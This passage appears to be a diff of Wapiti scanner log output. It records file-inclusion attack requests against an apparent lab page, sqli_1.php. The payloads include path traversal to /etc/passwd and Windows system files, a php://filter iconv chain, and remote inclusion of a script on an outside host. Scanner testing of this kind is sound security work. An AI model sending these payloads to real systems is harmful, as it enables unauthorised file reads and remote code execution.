+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:41:22.810 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
+2024-03-20 16:41:22.818 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
+2024-03-20 16:41:22.825 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:41:22.831 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:41:22.837 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:41:22.843 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:41:22.851 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:41:22.856 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:41:22.863 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:41:22.870 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:41:22.877 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:41:22.886 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:41:22.896 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
+2024-03-20 16:41:22.906 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
+2024-03-20 16:41:22.911 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:41:22.918 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:41:22.925 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:41:22.932 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:41:22.938 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:41:22.945 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:41:22.952 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=file%3A%2F%2F%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:41:22.959 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&security_level=2
+2024-03-20 16:41:22.966 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:41:22.972 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:41:22.979 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&security_level=2
+2024-03-20 16:41:22.986 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:41:22.992 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:41:22.999 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:41:23.005 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=sqli_1.php&security_level=2
+2024-03-20 16:41:23.013 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=sqli_1.php%00&security_level=2
+2024-03-20 16:41:23.019 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=sqli_1.php%3A%3A%24DATA&security_level=2
+2024-03-20 16:41:23.027 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php
+2024-03-20 16:41:23.034 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00
+2024-03-20 16:41:23.041 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=%2Fetc%2Fpasswd
+2024-03-20 16:41:23.048 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=%2Fetc%2Fpasswd%00
+2024-03-20 16:41:23.054 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=%2Fetc%2Fservices
+2024-03-20 16:41:23.060 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=%2Fetc%2Fservices%00
+2024-03-20 16:41:23.068 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 16:41:23.073 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00
+2024-03-20 16:41:23.080 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA
+2024-03-20 16:41:23.087 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:41:23.093 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:41:23.100 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA
+2024-03-20 16:41:23.107 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F
+2024-03-20 16:41:23.113 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F
+2024-03-20 16:41:23.120 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:41:23.126 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:41:23.136 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:41:23.145 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:41:23.154 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:41:23.165 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:41:23.175 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:41:23.184 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:41:23.193 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:41:23.202 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:41:23.212 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:41:23.222 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:41:23.232 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp
+2024-03-20 16:41:23.241 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:41:23.251 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:41:23.259 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:41:23.268 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:41:23.277 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:41:23.287 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:41:23.297 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:41:23.307 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:41:23.316 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:41:23.326 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:41:23.336 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:41:23.346 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:41:23.357 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:41:23.366 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:41:23.376 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:41:23.386 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:41:23.397 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:41:23.406 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
